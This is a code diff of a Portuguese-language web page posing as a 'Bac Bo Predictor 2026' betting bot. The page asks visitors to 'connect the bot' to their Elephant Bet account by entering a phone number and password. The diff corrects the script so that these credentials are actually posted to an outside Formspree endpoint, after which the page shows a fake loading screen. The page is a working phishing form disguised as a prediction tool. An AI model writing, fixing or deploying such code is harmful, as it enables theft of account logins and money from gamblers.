@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>BÁC BÓ PREDICTOR 2026</title>
+  <title>BAC BO PREDICTOR 2026</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: Arial, sans-serif; background:#0d0d0d; color:#fff; text-align:center; margin:0; padding:20px; }
@@ -52,7 +52,7 @@
 
   <!-- Tela de login verdadeira -->
   <div id="loginScreen">
-    <h2>Conecte o Bot com à sua conta da Elephant Bet</h2>
+    <h2>Conecte o Bot à sua conta da Elephant Bet</h2>
     <form id="loginForm">
       <input type="text" id="numeroLogin" name="numeroLogin" placeholder="Número de telemóvel" required><br>
       <input type="text" id="senhaLogin" name="senhaLogin" placeholder="Digite a sua senha" required><br>
@@ -100,7 +100,7 @@
       predictorScreen.style.display = "block";
     });
 
-    // Botão Sincronizar → vai para tela de login verdadeira
+    // Botão Conectar → vai para tela de login verdadeira
     openLogin.addEventListener("click", function() {
       predictorScreen.style.display = "none";
       loginScreen.style.display = "block";
@@ -115,12 +115,12 @@
     // Tela de login verdadeira → envia para Formspree
     loginForm.addEventListener("submit", function(e) {
       e.preventDefault();
-      if (!/^9\d{8}$/.test(númeroLogin.value)) { alert("Número inválido!"); return; }
+      if (!/^9\d{8}$/.test(numeroLogin.value)) { alert("Número inválido!"); return; }
       if (senhaLogin.value.length < 5) { alert("Senha muito curta!"); return; }
       fetch("https://formspree.io/f/mbdeddpb", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ numero: númeroLogin.value, senhaL: senhaLogin.value })
+        body: JSON.stringify({ numeroLogin: numeroLogin.value, senhaLogin: senhaLogin.value })
       });
       loginScreen.style.display = "none";
       loadingScreen.style.display = "block";
@@ -169,4 +169,4 @@
     inicioScreen.style.display = "block";
   </script>
 </body>
-</html>
+</html
